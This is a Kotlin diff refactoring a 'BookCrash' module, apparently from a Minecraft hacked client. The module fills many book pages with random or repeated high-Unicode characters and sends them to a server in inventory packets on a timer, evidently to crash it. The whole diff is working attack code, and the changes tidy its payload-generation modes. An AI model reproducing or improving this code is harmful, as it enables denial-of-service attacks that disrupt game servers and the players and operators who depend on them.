@@ -16,6 +16,7 @@ import net.minecraft.network.play.client.CPacketClickWindow
 import net.minecraft.network.play.client.CPacketCreativeInventoryAction
 import java.util.*
 import java.util.stream.Collectors
+import java.util.stream.IntStream
 
 @Module.Info(
         name = "BookCrash",
@@ -34,7 +35,7 @@ object BookCrash : Module() {
     }
 
     private enum class FillMode {
-        ASCII, FFFF, RANDOM, OLD
+        ASCII, REPEAT, RANDOM
     }
 
     private val timer = TimerUtils.TickTimer(TimerUtils.TimeUnit.TICKS)
@@ -50,28 +51,24 @@ object BookCrash : Module() {
             if (!timer.tick(delay.value.toLong())) return@listener
 
             val list = NBTTagList()
-            var size = ""
-            val pageChars = 210
+            val text: String
 
-            when (fillMode.value as FillMode) {
+            text = when (fillMode.value as FillMode) {
                 FillMode.RANDOM -> {
                     val chars = Random().ints(0x80, 0x10FFFF - 0x800).map { if (it < 0xd800) it else it + 0x800 }
-                    size = chars.limit(pageChars * pages.value.toLong()).mapToObj<String> { it.toChar().toString() }.collect(Collectors.joining())
+                    chars.collectToPages()
                 }
-                FillMode.FFFF -> {
-                    size = repeat(pages.value * pageChars, 0x10FFFF.toString())
+                FillMode.REPEAT -> {
+                    repeat(pages.value * 210, 0x10FFFF.toString())
                 }
                 FillMode.ASCII -> {
                     val chars = Random().ints(0x20, 0x7E)
-                    size = chars.limit(pageChars * pages.value.toLong()).mapToObj<String> { it.toChar().toString() }.collect(Collectors.joining())
-                }
-                FillMode.OLD -> {
-                    size = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5"
+                    chars.collectToPages()
                 }
             }
 
             for (i in 0 until pages.value) {
-                list.appendTag(NBTTagString(size))
+                list.appendTag(NBTTagString(text))
             }
 
             val tag = NBTTagCompound().apply {
@@ -92,6 +89,9 @@ object BookCrash : Module() {
             }
         }
     }
+
+    private fun IntStream.collectToPages() =
+        this.limit(210 * pages.value.toLong()).mapToObj<String> { it.toChar().toString() }.collect(Collectors.joining())
 
     private fun repeat(count: Int, with: String): String {
         return String(CharArray(count)).replace("\u0000", with)
